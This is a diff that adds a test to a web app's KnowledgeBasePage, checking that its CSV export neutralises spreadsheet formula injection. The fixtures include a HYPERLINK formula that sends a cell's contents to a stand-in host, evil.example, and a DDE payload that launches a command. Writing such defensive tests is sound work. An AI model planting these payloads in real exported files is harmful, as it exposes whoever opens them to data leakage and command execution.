@@ -271,4 +271,62 @@ describe("KnowledgeBasePage", () => {
       click.mockRestore();
     }
   });
+
+  it("neutralizes cells a spreadsheet would evaluate as formulas (CSV injection)", async () => {
+    // Contributors write propositions freely (the API accepts all of these),
+    // so an exported cell must never start with a formula trigger.
+    const propositions = [
+      '=HYPERLINK("http://evil.example/?x="&A2,"click me")',
+      "+1+cmd|' /C calc'!A0",
+      "-2+3",
+      "@SUM(1,2)",
+      "\tleading tab",
+      "\rleading carriage return",
+      " =1+1",
+    ];
+    mockedApi.listAssertions.mockResolvedValue({
+      items: [
+        ...propositions.map((proposition, i) => ({ ...a1, id: `f${i}`, proposition })),
+        a2,
+      ],
+      total: propositions.length + 1,
+    });
+    const text = await exportedCsv();
+
+    expect(text).toContain(`\r\n"'=HYPERLINK(""http://evil.example/?x=""&A2,""click me"")",`);
+    expect(text).toContain("\r\n'+1+cmd|' /C calc'!A0,");
+    expect(text).toContain("\r\n'-2+3,");
+    expect(text).toContain(`\r\n"'@SUM(1,2)",`);
+    expect(text).toContain("\r\n'\tleading tab,");
+    expect(text).toContain(`\r\n"'\rleading carriage return",`);
+    expect(text).toContain("\r\n' =1+1,");
+    // Ordinary text is exported unchanged.
+    expect(text).toContain(`\r\n${a2.proposition},`);
+    for (const line of text.split("\r\n").slice(1)) {
+      expect(line).not.toMatch(/^"?[=+\-@\t]/);
+    }
+  });
 });
+
+/** Click Export CSV and return the downloaded file's text. */
+async function exportedCsv(): Promise<string> {
+  const user = userEvent.setup();
+  const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
+  Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
+  const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
+  try {
+    render(<KnowledgeBasePage />);
+    await screen.findByText(a2.proposition);
+    await user.click(screen.getByRole("button", { name: "Export CSV" }));
+    await waitFor(() => expect(createObjectURL).toHaveBeenCalledTimes(1));
+    const blob = createObjectURL.mock.calls[0][0];
+    return await new Promise<string>((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = () => resolve(reader.result as string);
+      reader.onerror = () => reject(reader.error);
+      reader.readAsText(blob);
+    });
+  } finally {
+    click.mockRestore();
+  }
+}
